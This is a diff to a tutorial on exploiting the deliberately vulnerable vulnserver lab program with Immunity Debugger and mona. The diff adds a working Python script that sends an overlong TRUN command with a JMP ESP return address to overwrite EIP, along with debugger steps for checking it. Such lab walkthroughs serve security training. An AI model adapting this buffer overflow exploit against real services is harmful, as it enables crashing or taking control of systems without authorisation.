@@ -323,9 +323,59 @@ It's time to find what pointer you need to use to direct the program to your She
 ![](/assets/images/monamodules2.png)
 
 10. Write down any of the column results that are mostly all "false." You will have to test these. In the instance of vulnserver, the result that will work is 625011af, but if you didn't know that, you might have to perform the next steps on multiple of these false column results.
-11. Edit the included jumpboyz.py script, edit the shellcode string with the reversed version of one of the results you got from step 10, for example: "\xaf\x11\x50\x62" represents 625011af. Ensure you edit the IP, port, and command of the script.
+11. Edit the included script
+
+```python
+import socket
+from time import sleep
+
+ip = "127.0.0.1"
+port = 9999
+
+fuzzBuffer = "A"
+buffer = ""
+command = "TRUN /.:/"
+eipValue = "\xaf\x11\x50\x62"
+
+print(f"[*] Connecting to {ip,port}")
+
+buffer = command    
+buffer += fuzzBuffer * 2003 + eipValue
+
+print(f"Sending payload, Buffer len: {len(buffer)}")
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(5)
+try:
+    conn = s.connect((ip, port))
+    recv = s.recv(1024)
+    s.send(buffer.encode("latin-1"))
+    s.close()
+except:
+    s.close()
+    print(f"EIP Sent, Buffer Length: {len(buffer)}")
+```
+
+
+Edit the shellcode string with the reversed version of one of the results you got from step 10, for example: 
+```python
+"\xaf\x11\x50\x62"
+```
+represents 625011af. 
+Ensure you edit the IP, port, and command of the script.
 12. Go back to Immunity's CPU window, click the black arrow, and type in the pointer tested to follow the expression (for instance: 625011af)
+
+![](/assets/images/blackarror.png)
+
 13. Click the pointer in the window in the top left-hand corner, click F2, you should see the value highlighted with a color. The objective is to set a break-point for testing.
+
+![](/assets/images/breakpoint.png)
+
 14. Now, you can click the "Play" button and observe "Running" in the bottom corner of Immunity.
-15. Run the python script Command: python jumpboyz.py
+15. Run the python script Command:
+```python
+python shellcodetest.py
+```
+
 16. If you see the pointer value written to the EIP, you can now generate Shellcode. If you don't see it, repeat the process with other column pointer values you identified as false from Step 9.
+
+![](/assets/images/eip3.png)
